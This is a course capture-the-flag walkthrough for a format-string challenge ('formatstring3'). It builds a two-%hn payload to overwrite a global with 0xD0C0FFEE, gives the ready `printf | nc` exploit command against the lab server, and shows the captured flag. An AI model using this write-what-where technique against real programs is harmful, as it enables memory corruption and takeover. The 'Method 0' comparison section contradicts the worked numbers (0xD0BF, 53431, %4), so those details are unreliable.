# formatstring3 Walkthrough

## What to remember for the exam

- Binary: `login`
- Bug: user input goes straight into `printf(input)`
- Goal: set global `utk_password` to `0xD0C0FFEE`
- Remote target: `moa6.eecs.utk.edu:32130`
- Core primitive: `%hn` writes the number of printed characters as a 16-bit value

If you only remember one thing: this challenge is solved by placing two target addresses in your input, then using padding plus two `%hn` writes to build the final 32-bit value.

---

## Exam quick start

Use this sequence under time pressure:

1. Confirm the target address printed by the binary.
2. Find the stack index of your input with `%p` probes.
3. Split the 32-bit value into two 16-bit halves.
4. Write the smaller half first, then the larger half.
5. Pad with `%Nc` until the print count reaches each halfword.

The rest of this page shows the exact manual process.

---

## Method 1: Do It Manually First

This is the version to practice before the exam.

### 1. Confirm target address and baseline output

```bash
cd /home/jbenjam7/cs466/ctf/formatstring3
./login <<< 'TEST'
```

You should see something like:
- `12341234 0x80e6048`

So target address is `0x080e6048`.

### 2. Find where your input appears on the stack

```bash
./login <<< 'AAAABBBB.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p'
```

You should see:

- `%5$p = 0x41414141` (`AAAA`)
- `%6$p = 0x42424242` (`BBBB`)

That means:
- 5th argument points to first 4 bytes of your payload
- 6th argument points to second 4 bytes of your payload

### 3. Split the desired value into two halfwords

Target value:
- `0xD0C0FFEE`

Split into 16-bit parts:
- high halfword: `0xD0C0` = `53440`
- low halfword: `0xFFEE` = `65518`

### 4. Decide write order and addresses

Because printed character count only increases, write smaller first.

Here values are:
- `0xD0C0` (53440) first
- `0xFFEE` (65518) second

Address mapping for a 32-bit value at `0x080e6048`:
- low halfword at `0x080e6048`
- high halfword at `0x080e604a`

So payload pointers should be:
1. `0x080e604a` (high halfword location) -> stack arg 5
2. `0x080e6048` (low halfword location) -> stack arg 6

Little-endian bytes:
- `0x080e604a` -> `\x4a\x60\x0e\x08`
- `0x080e6048` -> `\x48\x60\x0e\x08`

### 5. Compute the padding values

Printed count starts at 8 because of the two 4-byte raw addresses.

First write target:
- need count = `53440`
- already printed = `8`
- pad1 = `53440 - 8 = 53432`

Second write target:
- currently printed = `53440`
- need count = `65518`
- pad2 = `65518 - 53440 = 12078`

So format segment is:
- `%53432c%5$hn%12078c%6$hn`

### 6. Final payload and send

Use `printf` so escape bytes are interpreted and format string is sent literally.
Use `%%` in shell `printf` so target receives `%`.

```bash
printf '\x4a\x60\x0e\x08\x48\x60\x0e\x08%%53432c%%5$hn%%12078c%%6$hn\n' | nc moa6.eecs.utk.edu 32130
```

Expected success indicators:
- `d0c0ffee 0x80e6048`
- flag line prints after that

### 7. Quick formula for similar challenges

If writing two halfwords with `%hn`:

1. Put two target pointers first
2. Let `base = bytes_in_pointer_prefix`
3. `pad1 = first_value - base`
4. `pad2 = second_value - first_value`
5. Payload: `[ptr1][ptr2]%pad1c%X$hn%pad2c%Y$hn`

If `second_value < first_value`, use wrap-around:
- `pad2 = (second_value + 0x10000) - first_value`

---

## Method 2: Python Script Workflow

Use this for repeatability after you understand Method 1. The script automates:
- Stack offset discovery
- Halfword splitting
- Padding calculation
- Payload building

Script file:
- `exploit.py`

### Commands available

| Command | What it does | Example |
|---------|------------|---------|
| `find-offset` | Auto-detect where your input lands on stack | `python3 exploit.py find-offset` |
| `exploit` | Find offset + build + send full 32-bit write | `python3 exploit.py exploit --remote` |
| `leak` | Simple proof-of-concept stack read | `python3 exploit.py leak` |
| `write VALUE` | Simple 16-bit write (for learning) | `python3 exploit.py write 119` |

### Step-by-step terminal workflow

```bash
cd /home/jbenjam7/cs466/ctf/formatstring3

# Step 1: Find where your input lands on the stack
python3 exploit.py find-offset
# Output: [+] Input starts at stack argument %5$...

# Step 2: Exploit with auto-detected offset
python3 exploit.py exploit --remote
# Output:
#   [*] Using base offset: %5$
#   [*] Target address: 0x080e6048
#   [*] Target value:   0xd0c0ffee
#   [*] Payload length: 33 bytes
#   d0c0ffee 0x80e6048
#   cosc466-flag-{WaYgSpU5rSEUbXW6CPVF}
```

### How to use the script during the exam

If the challenge is the same binary or a close variant, this is the fastest workflow:

1. Run `python3 exploit.py find-offset` to confirm the stack index.
2. Run `python3 exploit.py exploit --remote` to attempt the full write.
3. If the target address or value changes, pass them explicitly:

```bash
python3 exploit.py exploit 0x80e6048 0xD0C0FFEE --remote
```

If the exploit fails, fall back to the manual method above and rebuild the padding by hand.

### Retargeting (custom address/value)

```bash
# Use explicit target address and value
python3 exploit.py exploit 0x12345678 0xAABBCCDD --remote

# Local testing (no --remote flag)
python3 exploit.py exploit 0x80e6048 0xD0C0FFEE
```

### How the Python script differs from manual method

**Manual method (Method 0):**
- You discover offset by hand: `AAAABBBB.%0$p...%8$p`
- You manually split: high = 0xD0BF, low = 0xFFEE
- You manually convert to little-endian bytes
- You manually calculate paddings: 53431 and 12078
- You craft one raw `printf | nc` command
- Good for learning; prone to arithmetic errors

**Python method:**
- Script sends probe and parses output to find offset automatically
- Script splits halfwords and calculates paddings for you
- Script handles endianness conversion
- Script builds payload with correct format indices (%4, %6, etc.)
- Single command does all of it
- Good for repeated/automated exploitation

### Key advantage: Adaptive to offset changes

If the stack layout changes and offset moves from %5 to something else:

**Manual method:**
- You'd have to redo all your math and edit the printf command

**Python method:**
- Just run: `python3 exploit.py find-offset`
- Then: `python3 exploit.py exploit --remote`
- Script auto-detects new offset and adapts payload

### Why this helps

- No manual calculations or endian handling needed
- Faster for retargeting different address/value pairs
- Robust to stack offset changes
- Better for production/repeated exploits
- Still performs the same two-halfword write technique underneath

---

## Common Pitfalls

1. Missing `printf` in shell pipeline
- Wrong: `'\x4a...\n' | nc ...`
- Right: `printf '\x4a...\n' | nc ...`

2. Forgetting double percent in shell `printf`
- In shell command string, use `%%53432c%%5$hn...`
- Target process receives `%53432c%5$hn...`

3. Wrong endianness
- x86 is little-endian, so address bytes look reversed

4. Wrong write order
- Write smaller halfword count first unless using explicit wrap math

5. Treating 128-byte input as a blocker
- Width specifiers (`%53432c`) generate large output count without needing giant input

---

## Exam workflow to memorize

Before the exam, practice this sequence until it is automatic:

1. Leak the stack position with `%p` probes.
2. Identify the two argument positions that hold your injected addresses.
3. Split the target value into low and high halfwords.
4. Put the smaller halfword first to keep the padding simple.
5. Calculate padding from the current printed count.
6. Send the payload with `printf | nc` or the Python helper.

That is the full pattern. The exact numbers change, but the workflow does not.

## Learning Path & Recommended Workflow

### For first-time learning:
1. Read **Method 1** completely
2. Run steps 1-6 manually in terminal
3. Verify you get the flag with `printf | nc`
4. Then read **Method 2** to see how it automates everything

### For repeated exploitation:
1. Use `python3 exploit.py find-offset` to verify current stack layout
2. Use `python3 exploit.py exploit --remote` to exploit
3. Done

### The core technique you learned:
- Format strings control printed character count
- `%hn` writes that count (16-bit) to a memory address
- Split a 32-bit target into two 16-bit halfwords
- Use padding (`%Nc`) to reach exact character counts
- Two writes = one complete 32-bit value

This technique applies to many other format-string challenges beyond this one.

---

## Summary

**Challenge:** Overwrite a 32-bit global variable via format-string exploit using two `%hn` writes.

**Key insight:** `%hn` writes the number of printed characters so far. Use padding to control exact values and split 32-bit targets into two halfword writes.

**Two ways to solve:**
1. **Manual:** Calculate and build payload by hand. Best for learning.
2. **Python:** Script auto-detects offset and builds payload. Best for speed and reuse.

**Both produce the same result:** `0xD0C0FFEE` in memory, flag unlocked.

**Exam tip:** if you are unsure, rebuild the exploit from the manual method first, then switch to the script only after you know the stack index and halfword values.
